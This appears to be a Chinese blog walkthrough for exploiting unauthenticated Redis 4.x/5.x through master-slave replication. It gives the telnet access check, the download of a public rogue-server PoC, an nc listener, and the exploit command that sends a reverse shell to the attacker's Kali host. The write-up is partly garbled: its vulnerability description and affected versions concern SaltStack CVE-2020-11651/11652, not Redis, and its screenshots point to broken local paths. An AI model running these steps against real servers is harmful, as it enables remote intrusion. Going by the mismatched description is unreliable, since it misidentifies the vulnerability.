# Redis 4.x5.x 未授权访问漏洞（Redis基于主从复制的RCE）

# 漏洞描述

SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。

在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。

# 影响范围

- SaltStack < 2019.2.4
- SaltStack < 3000.2



环境启动后，直接执行telnet，不用登录，就可以访问redis

```
telnet xxx 6379
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201205200843434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5MTU2NjcwNzY1MjY=,size_16,color_FFFFFF,t_70)



下载POC

```
https://github.com/n0b0dyCN/redis-rogue-server
```



kali监听IP

```
nc -lvvp xxx     //端口号随机
```

下载后，在kali上直接运行（rhost是目标IP也就是redis，lhost是原IP就是kali的反弹shellIP），这里执行不成功就多执行几次

```
./redis-rogue-server.py --rhost xxx --lhost xxx
```

运行后提示让你输交互式还是反弹，我这里选反弹r

输入反弹IP和端口，直接输入IP就好

反弹shell，急着kali中先监听，比如我想让他往我的kali，xxx上的9999端口反弹

![image-20220426145644439](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220426145644439.png)



反弹shell选r

在本地命令执行选i

address:xxx     IP

port:xxx     需要反弹到哪个端口



查看kali监听的端口，拿下

![image-20220426145812924](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220426145812924.png)







